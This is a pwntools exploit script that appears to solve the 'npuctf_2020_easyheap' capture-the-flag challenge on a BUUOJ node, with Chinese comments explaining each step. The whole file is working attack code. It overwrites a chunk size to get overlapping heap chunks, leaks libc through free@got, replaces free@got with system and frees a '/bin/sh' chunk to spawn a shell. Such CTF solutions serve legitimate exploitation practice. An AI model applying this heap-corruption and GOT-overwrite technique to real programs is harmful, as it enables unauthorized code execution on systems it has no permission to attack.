from pwn import *

context(log_level = "debug")
context(os="linux", arch="amd64")

if args.REMOTE:
    p = remote('node4.buuoj.cn', 26088)
else:
    context.terminal = ["tmux","splitw","-h"]
    p = process('./npuctf_2020_easyheap')
    gdb.attach(p)

def create(size: int, content: bytes):
    assert size == 0x18 or size == 0x38, "wrong size"
    p.sendlineafter(b'Your choice :', b'1')
    p.sendlineafter(b'Size of Heap(0x10 or 0x20 only) :', str(size).encode())
    p.sendafter(b'Content:', content)

def edit(index: int, content: bytes):
    p.sendlineafter(b'Your choice :', b'2')
    p.sendlineafter(b'Index :', str(index).encode())
    p.sendafter(b'Content: ', content)

def show(index: int):
    p.sendlineafter(b'Your choice :', b'3')
    p.sendlineafter(b'Index :', str(index).encode())
    
def delete(index: int):
    p.sendlineafter(b'Your choice :', b'4')
    p.sendlineafter(b'Index :', str(index).encode())

e = ELF('./npuctf_2020_easyheap')
libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
# 下面这个glibc-all-in-one的libc2.27不对，可能是版本高了一点。
# libc = ELF('/home/leo/tools/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so')
# print(hex(libc.sym['free']))

# 通过覆盖size域来实现堆块重叠，再delete，然后malloc(0x38)和malloc(0x10)就会造成数据堆块与管理堆块重叠。
# 接着就可以控制管理堆块上记录的指针，实现got表地址的读取与修改
create(0x18, b'/bin/sh\x00') # id0
create(0x18, b'a'*8) # id1

# overlap chunk
edit(0, b'/bin/sh\x00'+b'a'*0x10 + b'\x41')

# chunk被放入tcache bin时，系统不会将其下一个chunk的prev_inuse清0，所以这里不用担心最后的chunk被free之后与top chunk合并
delete(1)
create(0x38, b'c'*8) # id1
edit(1, b'c'*0x18 + p64(0x21) + p64(0x38) + p64(e.got['free']))

# leak libc
show(1)
free_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00'))
libc_base = free_addr - libc.sym['free']
p.success(hex(libc_base))
system_addr = libc_base + libc.sym['system']

# modify free@got
edit(1, p64(system_addr))
delete(0)

p.interactive()